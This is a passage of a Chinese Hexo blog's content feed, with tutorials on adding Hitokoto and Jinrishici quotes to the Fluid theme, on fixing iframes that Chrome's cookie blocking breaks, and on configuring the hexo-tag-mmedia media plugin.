class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scarleastdeMacBook-Pro:gaficat_blog scarleast$ sublime themes/hexo-theme-fluid-1.8.3/layout/_partial/plugins/typed.ejs<br></code></pre></td></tr></table></figure><ol start="2"><li>复制我修改好的ejs文件。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;% if(theme.fun_features.typing.enable &amp;&amp; page.subtitle !&#x3D;&#x3D; false)&#123; %&gt;<br>  &lt;%- js_ex(theme.static_prefix.typed, &quot;&#x2F;typed.min.js&quot;) %&gt;<br><br>  &lt;% if(is_home()) &#123; %&gt;<br>    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;<br>        !function(e)&#123;var n,t&#x3D;&#123;&#125;,o&#x3D;&quot;jinrishici-token&quot;;function i()&#123;return document.getElementById(&quot;jinrishici-sentence&quot;)||0!&#x3D;document.getElementsByClassName(&quot;jinrishici-sentence&quot;).length&#125;function c()&#123;t.load(function(e)&#123;var n&#x3D;document.getElementById(&quot;jinrishici-sentence&quot;),t&#x3D;document.getElementsByClassName(&quot;jinrishici-sentence&quot;);if(n&amp;&amp;(n.innerText&#x3D;e.data.content),0!&#x3D;&#x3D;t.length)for(var o&#x3D;0;o&lt;t.length;o++)t[o].innerText&#x3D;e.data.content&#125;)&#125;function r(e,n)&#123;var t&#x3D;new XMLHttpRequest;t.open(&quot;get&quot;,n),t.withCredentials&#x3D;!0,t.send(),t.onreadystatechange&#x3D;function(n)&#123;if(4&#x3D;&#x3D;&#x3D;t.readyState)&#123;var o&#x3D;JSON.parse(t.responseText);&quot;success&quot;&#x3D;&#x3D;&#x3D;o.status?e(o):console.error(&quot;今日诗词API加载失败，错误原因：&quot;+o.errMessage)&#125;&#125;&#125;t.load&#x3D;function(n)&#123;return e.localStorage&amp;&amp;e.localStorage.getItem(o)?function(e,n)&#123;return r(e,&quot;https:&#x2F;&#x2F;v2.jinrishici.com&#x2F;one.json?client&#x3D;browser-sdk&#x2F;1.2&amp;X-User-Token&#x3D;&quot;+encodeURIComponent(n))&#125;(n,e.localStorage.getItem(o)):function(n)&#123;return r(function(t)&#123;e.localStorage.setItem(o,t.token),n(t)&#125;,&quot;https:&#x2F;&#x2F;v2.jinrishici.com&#x2F;one.json?client&#x3D;browser-sdk&#x2F;1.2&quot;)&#125;(n)&#125;,e.jinrishici&#x3D;t,i()?c():(n&#x3D;function()&#123;i()&amp;&amp;c()&#125;,&quot;loading&quot;!&#x3D;document.readyState?n():document.addEventListener?document.addEventListener(&quot;DOMContentLoaded&quot;,n):document.attachEvent(&quot;onreadystatechange&quot;,function()&#123;&quot;complete&quot;&#x3D;&#x3D;document.readyState&amp;&amp;n()&#125;))&#125;(window); <br>    &lt;&#x2F;script&gt;<br><br>    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;<br>      if(Math.random() &lt; 0.5)&#123;<br>        jinrishici.load(function(result) &#123;<br>          var typed &#x3D; new Typed(&#39;#subtitle&#39;, &#123;<br>          strings: [<br>            &#39;  &#39;,<br>            &quot;&lt;%- data.subtitle %&gt;&amp;nbsp;&quot; + &quot;&lt;br&gt;&lt;br&gt;&quot; + result.data.content + &quot;&lt;br&gt;&quot; + &quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;—&quot; + &#39;【&#39; + result.data.origin.dynasty + &#39;】&#39; + result.data.origin.author + &#39;《&#39; + result.data.origin.title + &#39;》&#39;,<br>          ],<br>          cursorChar: &quot;&lt;%- theme.fun_features.typing.cursorChar %&gt;&quot;,<br>          typeSpeed: &lt;%- theme.fun_features.typing.typeSpeed %&gt;,<br>          loop: &lt;%- theme.fun_features.typing.loop %&gt;,<br>          &#125;);<br>          typed.stop();<br>          $(document).ready(function () &#123;<br>            $(&quot;.typed-cursor&quot;).addClass(&quot;h2&quot;);<br>            typed.start();<br>          &#125;); <br>        &#125;); <br>      &#125;else&#123;<br>        fetch(&#39;https:&#x2F;&#x2F;v1.hitokoto.cn&#39;)<br>        .then(response &#x3D;&gt; response.json())<br>        .then(data &#x3D;&gt; &#123;<br>          if(data.from_who)&#123;<br>            var typed &#x3D; new Typed(&#39;#subtitle&#39;, &#123;<br>              strings: [<br>                &#39;  &#39;,<br>                &quot;&lt;%- data.subtitle %&gt;&amp;nbsp;&quot; + &quot;&lt;br&gt;&lt;br&gt;&quot; + data.hitokoto + &quot;&lt;br&gt;&quot; + &quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;— &quot; + data.from_who +&#39;《&#39; + data.from + &#39;》&#39;,<br>              ],<br>              cursorChar: &quot;&lt;%- theme.fun_features.typing.cursorChar %&gt;&quot;,<br>              typeSpeed: &lt;%- theme.fun_features.typing.typeSpeed %&gt;,<br>              loop: &lt;%- theme.fun_features.typing.loop %&gt;,<br>            &#125;);<br>            <br>          &#125;else&#123;<br>            var typed &#x3D; new Typed(&#39;#subtitle&#39;, &#123;<br>              strings: [<br>                &#39;  &#39;,<br>                &quot;&lt;%- data.subtitle %&gt;&amp;nbsp;&quot; + &quot;&lt;br&gt;&lt;br&gt;&quot; + data.hitokoto + &quot;&lt;br&gt;&quot; + &quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;— &quot; + &#39;《&#39; + data.from + &#39;》&#39;,<br>              ],<br>              cursorChar: &quot;&lt;%- theme.fun_features.typing.cursorChar %&gt;&quot;,<br>              typeSpeed: &lt;%- theme.fun_features.typing.typeSpeed %&gt;,<br>              loop: &lt;%- theme.fun_features.typing.loop %&gt;,<br>            &#125;);<br>          &#125;<br>          typed.stop();<br>          $(document).ready(function () &#123;<br>            $(&quot;.typed-cursor&quot;).addClass(&quot;h2&quot;);<br>            typed.start();<br>          &#125;);  <br>        &#125;)<br>        .catch(console.error)<br>      &#125;<br>    &lt;&#x2F;script&gt;<br>  &lt;% &#125; else &#123; %&gt;<br>    &lt;script&gt;<br>      var typed &#x3D; new Typed(&#39;#subtitle&#39;, &#123;<br>        strings: [<br>          &#39;  &#39;,<br>          &quot;&lt;%- data.subtitle %&gt;&amp;nbsp;&quot;,<br>        ],<br>        cursorChar: &quot;&lt;%- theme.fun_features.typing.cursorChar %&gt;&quot;,<br>        typeSpeed: &lt;%- theme.fun_features.typing.typeSpeed %&gt;,<br>        loop: &lt;%- theme.fun_features.typing.loop %&gt;,<br>      &#125;);<br>      typed.stop();<br>      $(document).ready(function () &#123;<br>        $(&quot;.typed-cursor&quot;).addClass(&quot;h2&quot;);<br>        typed.start();<br>      &#125;);<br>    &lt;&#x2F;script&gt;<br>  &lt;% &#125; %&gt;<br><br><br>&lt;% &#125; %&gt;<br><br></code></pre></td></tr></table></figure><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>hexo的好处是，可以直接使用markdown来写文章，无需关注复杂的前端，因为有大神给你写好了各种主题。但是，没有主题是完美的，因为每个人的需求都不一样，你可能需要在网站的底下加上又拍云的logo，来蹭一波免费的额度；你可能看到了某个有意思的功能，需要修改一些代码，才能实现一些好玩的东西。</p><p>很感谢<a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid</a>主题的开发者们，这个主题简洁、美观。并且我这样一个前端小白，提过很多很简单的Issues，这个主题的开发者也很耐心的作了回复。希望我这篇文章能帮到一些铁子吧，毕竟看到挺多铁子都提了关于整合Hitokoto的Issues。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录chrome禁止cookie导致无法显示iframe的问题</title>
    <link href="/posts/1d5c6ccb.html"/>
    <url>/posts/1d5c6ccb.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>这篇文章记录了因设置禁止chrome的cookie，导致部分iframe无法渲染显示（bilibili、网易云音乐等<code>iframe</code>分享无法显示）的问题。</p><a id="more"></a><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近升级了一下hexo的版本，结果惊奇地发现我网站所有的bilibili、网易云<code>iframe</code>分享都不能显示了，在重新安装nodejs，hexo，重新安装各种插件，重新配置各种主题之后，问题依然没有解决，我以为是hexo升级炸了。</p><p>结果阴差阳错，用手机打开了自己的网站，发现都好使呢啊？加上想起来前两天用语雀，bilibili的视频也无法播放，直觉告诉我，应该不是hexo的锅，应该是chrome浏览器的锅，结果使用safari和firefox都能正常显示bilibili、网易云的<code>iframe</code>分享，确定，一定是chrome的问题。</p><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>我在之前设置过chrome的cookie，禁止第三方cookie:</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:40%;"     src="https://pic.gaficat.com/default/阻止cookie.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">阻止cookie的设置</div></br> </center><p>就是这个设置，导致bilibili、网易云分享的<code>iframe</code>无法正常显示，不太清楚，为什么youtube是好使的。</p><blockquote><p><strong>这里的无法正常显示，只是我们自己的chrome浏览器无法正常显示，可以尝试使用其他浏览器或者使用手机的浏览器，在不是无痕模式的前提下访问试试看以定位问题。我当时真的坚定的认为是自己的hexo有问题，折腾了好长时间。</strong></p></blockquote><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>我们其实可以根据需要，允许一部分cookie，比如允许bilibili的播放器：</p><center><img src="https://pic.gaficat.com/default/允许cookie.png" alt="允许cookie的设置" style="zoom:30%;" /><br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">允许cookie的设置</div></br></center><p>注意到地址栏的那个小眼睛图标了吗？当chrome浏览器禁止cookie之后，无法使用cookie的网站就会在地址栏出现那个小眼睛。点击那个小眼睛，就可以看到我们允许的cookie和禁止的cookie，bilibili的<code>iframe</code>播放器就是<code>player.bilibili.com</code>，允许它的cookie，我们的chrome就又能正常显示这些网站的<code>iframe</code>了。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>真是自己都记不得自己什么时候设置过cookie，可能一开始为了防止自己的隐私泄露吧。我真的一度认为是自己hexo出问题了或者我的chrome浏览器出问题了。一个小坑，分享给不知道的小伙伴吧。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>给你的hexo插入音乐视频</title>
    <link href="/posts/353df0b0.html"/>
    <url>/posts/353df0b0.html</url>
    
    <content type="html"><![CDATA[<p>本文介绍一个hexo插件:<code>hexo-tag-mmedia</code>，方便插入音乐、视频、bilibili等资源。</p><a id="more"></a><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在hexo上插入音乐一般使用插件<a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a>，插入视频通常使用<a href="https://github.com/MoePlayer/hexo-tag-dplayer">hexo-tag-dplayer</a>或者直接使用bilibili分享的iframe嵌在文章内即可。但<a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a>和<a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a>存在冲突，将导致网站的rss摘要出现问题。</p><p>我在很早之前就关注了<a href="https://seekbetter.me/">寻我</a>（一个博客聚合的网站），站长给了我非常多的首页推荐，我的网站在那里被很多人看到，很感谢那位不知姓名的站长。</p><p>但是最近发现，寻我上我文章的摘要没有了，所有排查了一下<code>rss</code>，发现摘要变成了下面这样：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;summary type=&quot;html&quot;&gt;&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;&lt;/summary&gt;<br></code></pre></td></tr></table></figure><p>分析了几个小时，发现这种现象的原因是<a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a>和<a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a>这两个插件存在冲突，具体原理我不太清楚，但不使用<a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a>插件或者修改博客根目录下的<code>_config.yml</code>文件均能解决：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">aplayer:</span><br>  <span class="hljs-attr">asset_inject:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>虽然<code>rss</code>就恢复正常了，但要么不使用aplayer无法给文章插入音乐；或者修改<code>_config.yml</code>，文章中<code>aplayer</code>的引用无效。都不是完美的解决方法。</p><h1 id="hexo-tag-mmedia"><a href="#hexo-tag-mmedia" class="headerlink" title="hexo-tag-mmedia"></a>hexo-tag-mmedia</h1><p><a href="https://github.com/u2sb/hexo-tag-mmedia">hexo-tag-mmedia</a>是一个聚合的媒体插入插件，安装这一个插件，相当于安装了以下的插件：</p><ul><li><a href="https://github.com/DIYgod/APlayer">Aplayer</a>：一个用的很多的音乐播放插件</li><li><a href="https://github.com/metowolf/MetingJS">Meting</a>：一个网易云音乐、百度、腾讯、搜狗、虾米的音乐播放插件</li><li><a href="https://github.com/DIYgod/DPlayer">Dplayer</a>：一个视频播放插件</li><li><a href="https://www.bilibili.com/">Bilibili</a>：一个插入bilibili视频的插件</li><li><a href="https://www.u2sb.top/docs/hexo-tag-mmedia/">YouTube</a>（开发中）</li><li><a href="https://github.com/zhw2590582/ArtPlayer">ArtPlayer</a>（开发中）</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>删除已安装的几个插件，以防冲突。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm uninstall hexo-tag-aplayer<br>npm uninstall hexo-tag-dplayer<br>npm uninstall hexo-tag-bilibili<br></code></pre></td></tr></table></figure><ol start="2"><li>安装hexo-tag-mmedia </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install hexo-tag-mmedia --save<br></code></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>如果不需要自定义设置，不需要修改 <code>_config.yml</code> ，直接使用即可：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">mmedia:</span><br>  <span class="hljs-attr">aplayer:</span><br>    <span class="hljs-attr">cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js</span><br>    <span class="hljs-attr">style_cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css</span><br>    <span class="hljs-attr">default:</span><br>  <span class="hljs-attr">meting:</span><br>    <span class="hljs-attr">cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js</span><br>    <span class="hljs-attr">api:</span><br>    <span class="hljs-attr">default:</span><br>  <span class="hljs-attr">dplayer:</span><br>    <span class="hljs-attr">cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/dplayer/dist/DPlayer.min.js</span><br>    <span class="hljs-attr">style_cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/dplayer/dist/DPlayer.min.css</span><br>    <span class="hljs-attr">hls_cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/hls.j/dist/hls.min.js</span><br>    <span class="hljs-attr">dash_cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/dashjs/dist/dash.all.min.js</span><br>    <span class="hljs-attr">shaka_dash_cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/shaka-player/dist/shaka-player.compiled.js</span><br>    <span class="hljs-attr">flv_cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/flv.js/dist/flv.min.js</span><br>    <span class="hljs-attr">webtorrent_cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/webtorrent/webtorrent.min.js</span><br>    <span class="hljs-attr">default:</span><br></code></pre></td></tr></table></figure><p><code>default</code>可以设置默认参数：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">meting:</span><br>  <span class="hljs-attr">cdn:</span> <span class="hljs-string">https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js</span><br>  <span class="hljs-attr">api:</span><br>  <span class="hljs-attr">default:</span><br>    <span class="hljs-attr">order:</span> <span class="hljs-string">random</span><br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>注意复制代码的时候，不要把代码块的格式复制进去了，我之前使用typora，复制下面的代码，结果死活不渲染，郁闷了挺久。</p><h3 id="Aplayer"><a href="#Aplayer" class="headerlink" title="Aplayer"></a>Aplayer</h3><p>这是一个播放音乐的插件，个人感觉不是特别好用，因为歌曲模式会自动循环播放，歌单模式，hexo-tag-mmedia支持暂时不完善。</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %&#125;<br></code></pre></td></tr></table></figure><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;% aplayer <span class="hljs-string">&quot;大调&quot;</span> <span class="hljs-string">&quot;官大为&quot;</span> <span class="hljs-string">&quot;https://music.gaficat.com/%E5%A4%A7%E8%B0%83.mp3&quot;</span> %&#125;<br></code></pre></td></tr></table></figure><h4 id="字段说明"><a href="#字段说明" class="headerlink" title="字段说明"></a><strong>字段说明</strong></h4><table><thead><tr><th>配置项</th><th>默认</th><th>说明</th></tr></thead><tbody><tr><td>title</td><td>必须</td><td>曲目标题，第一个参数</td></tr><tr><td>author</td><td>必须</td><td>曲目作者，第二个参数</td></tr><tr><td>url</td><td>必须</td><td>音乐文件地址</td></tr><tr><td>picture_url</td><td>none</td><td>音乐对应的图片地址</td></tr><tr><td>narrow</td><td><code>false</code></td><td>袖珍风格，带有此参数表示 <code>true</code> ，不带表示 <code>false</code></td></tr><tr><td>autoplay</td><td><code>false</code></td><td>自动播放，带有此参数表示 <code>true</code> ，不带表示 <code>false</code></td></tr><tr><td>width:xxx</td><td><code>100%</code></td><td>播放器宽度</td></tr><tr><td>lrc</td><td>none</td><td>歌词地址</td></tr></tbody></table><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a><strong>效果</strong></h4>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-bEitGWmL" style="margin-bottom: 20px; width: "></div>        <script>          var ap_bEitGWmL = new APlayer({            element: document.getElementById("mmedia-bEitGWmL"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "大调",              author: "官大为",              url: "https://music.gaficat.com/%E5%A4%A7%E8%B0%83.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_bEitGWmL);        </script><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h4><p>AplayerList似乎有bug，我暂时没有使用。</p><hr><h3 id="MetingJS"><a href="#MetingJS" class="headerlink" title="MetingJS"></a>MetingJS</h3><p>这是一个插入各家音乐平台音乐的插件，个人觉得非常好用，特别是qq音乐的独家竟然也可以放，太顶了。</p><h4 id="格式（下面两个都可以）"><a href="#格式（下面两个都可以）" class="headerlink" title="格式（下面两个都可以）"></a>格式（下面两个都可以）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% meting &quot;001Mf4Ic1aNYYK&quot; &quot;tencent&quot; &quot;album&quot; &quot;order:random&quot; &quot;listmaxheight:180px&quot; %&#125;<br><br>&#123;% meting &quot;auto:https://y.qq.com/n/yqq/song/001Mf4Ic1aNYYK.html&quot; %&#125;<br></code></pre></td></tr></table></figure><h4 id="字段说明-1"><a href="#字段说明-1" class="headerlink" title="字段说明"></a>字段说明</h4><table><thead><tr><th align="left">字段</th><th align="left">默认</th><th>描述</th></tr></thead><tbody><tr><td align="left">id</td><td align="left">必须</td><td>音乐 id，第一个参数</td></tr><tr><td align="left">server</td><td align="left">必须</td><td>音乐平台，第二个参数，可选： <code>netease</code> , <code>tencent</code> , <code>kugou</code> , <code>xiami</code> , <code>baidu</code></td></tr><tr><td align="left">type</td><td align="left">必须</td><td>音乐类型，第三个参数，可选： <code>song</code> , <code>playlist</code> , <code>album``search</code> , <code>artist</code></td></tr><tr><td align="left">auto</td><td align="left">无</td><td>有 auto 选项时前三个参数不需要填写，否则为必填，如格式中的第二个。</td></tr><tr><td align="left">autoplay</td><td align="left"><code>false</code></td><td>自动播放，带有此参数表示 <code>true</code> ，不带表示 <code>false</code></td></tr><tr><td align="left">fixed</td><td align="left"><code>false</code></td><td>吸底模式，带有此参数表示 <code>true</code> ，不带表示 <code>false</code></td></tr><tr><td align="left">mini</td><td align="left"><code>false</code></td><td>迷你模式，带有此参数表示 <code>true</code> ，不带表示 <code>false</code></td></tr><tr><td align="left">listfolded</td><td align="left"><code>false</code></td><td>默认折叠列表，带有此参数表示 <code>true</code> ，不带表示 <code>false</code></td></tr><tr><td align="left">mutex</td><td align="left"><code>true</code></td><td>互斥，如不需互斥 <code>&quot;mutex:false&quot;</code></td></tr><tr><td align="left">theme</td><td align="left"><code>#2980b9</code></td><td>主题颜色</td></tr><tr><td align="left">loop</td><td align="left"><code>all</code></td><td>循环模式 ，可选值 <code>all</code> , <code>one</code> , <code>none</code></td></tr><tr><td align="left">order</td><td align="left"><code>list</code></td><td>播放顺序，可选值 <code>list</code> , <code>random</code></td></tr><tr><td align="left">preload</td><td align="left"><code>auto</code></td><td>预加载模式 ，可选 <code>none</code> , <code>metadata</code> , <code>auto</code></td></tr><tr><td align="left">volume</td><td align="left"><code>0.7</code></td><td>默认音量，可选 <code>0-1</code></td></tr><tr><td align="left">lrctype</td><td align="left"><code>0</code></td><td>歌词类型</td></tr><tr><td align="left">listmaxheight</td><td align="left"><code>340px</code></td><td>播放器最大高度</td></tr><tr><td align="left">storagename</td><td align="left">metingjs</td><td></td></tr></tbody></table><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% meting <span class="hljs-string">&quot;002nf0kI0YUPR9&quot;</span> <span class="hljs-string">&quot;tencent&quot;</span> <span class="hljs-string">&quot;song&quot;</span> <span class="hljs-string">&quot;loop:none&quot;</span>  %&#125;<br></code></pre></td></tr></table></figure><blockquote><p> 这里qq音乐举例，最顶的是qq音乐独家的也能播放，id是后面链接中.html前面的一串字符：<a href="https://y.qq.com/n/yqq/song/002nf0kI0YUPR9.html">https://y.qq.com/n/yqq/song/002nf0kI0YUPR9.html</a></p></blockquote><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <script src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>            <meting-js  id="002nf0kI0YUPR9" server="tencent" type="song" autoplay="false" mutex="true" listmaxheight="340px" preload="auto" theme="#ad7a86" loop="none"></meting-js><hr><h3 id="Dplayer"><a href="#Dplayer" class="headerlink" title="Dplayer"></a>Dplayer</h3><p>这是一个播放视频的插件。</p><h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span> dplayer <span class="hljs-string">&quot;url:KeyCastOW.mp4&quot;</span> <span class="hljs-string">&quot;id:DDEC4F882C0B66FAD&quot;</span> <span class="hljs-string">&quot;addition:addition0&quot;</span> <span class="hljs-string">&quot;addition:addition1&quot;</span> <span class="hljs-meta">%</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="字段说明-2"><a href="#字段说明-2" class="headerlink" title="字段说明"></a>字段说明</h4><table><thead><tr><th align="left">配置项</th><th align="left">默认</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">url</td><td align="left">必填</td><td align="left">视频地址</td></tr><tr><td align="left">pic</td><td align="left"></td><td align="left">封面</td></tr><tr><td align="left">thumbnails</td><td align="left"></td><td align="left">缩略图</td></tr><tr><td align="left">type</td><td align="left"><code>auto</code></td><td align="left">视频格式，可选 <code>auto</code> <code>hls</code> <code>dash</code> <code>shakaDash</code> <code>flv</code> <code>webtorrent</code></td></tr><tr><td align="left">id</td><td align="left"></td><td align="left">弹幕 id，建议使用视频的 CRC 或 MD5，再或使用 UUID</td></tr><tr><td align="left">api</td><td align="left"></td><td align="left">弹幕 api</td></tr><tr><td align="left">token</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">maximum</td><td align="left"><code>10000</code></td><td align="left">最大弹幕数</td></tr><tr><td align="left">user</td><td align="left"><code>DIYgod</code></td><td align="left">弹幕发送用户名</td></tr><tr><td align="left">bottom</td><td align="left"><code>15%</code></td><td align="left">弹幕底端距离</td></tr><tr><td align="left">unlimited</td><td align="left"><code>true</code></td><td align="left"></td></tr><tr><td align="left">addition</td><td align="left"></td><td align="left">额外弹幕，可重叠加多个</td></tr><tr><td align="left">suburl</td><td align="left"></td><td align="left">字幕地址</td></tr><tr><td align="left">subtype</td><td align="left"><code>webvtt</code></td><td align="left">字幕类型，可选 <code>webvtt</code> <code>ass</code></td></tr><tr><td align="left">subbottom</td><td align="left"><code>40px</code></td><td align="left">字幕底端距离</td></tr><tr><td align="left">subfontSize</td><td align="left"><code>20px</code></td><td align="left">字幕字体大小</td></tr><tr><td align="left">subcolor</td><td align="left">#fff</td><td align="left">字幕字体颜色</td></tr><tr><td align="left">autoplay</td><td align="left"><code>false</code></td><td align="left">自动播放，带有此参数表示 true，不带表示 false</td></tr><tr><td align="left">loop</td><td align="left"><code>false</code></td><td align="left">循环，带有此参数表示 true，不带表示 false</td></tr><tr><td align="left">screenshot</td><td align="left"><code>false</code></td><td align="left">截屏按钮，带有此参数表示 true，不带表示 false，此参数会造成跨域</td></tr><tr><td align="left">hotkey</td><td 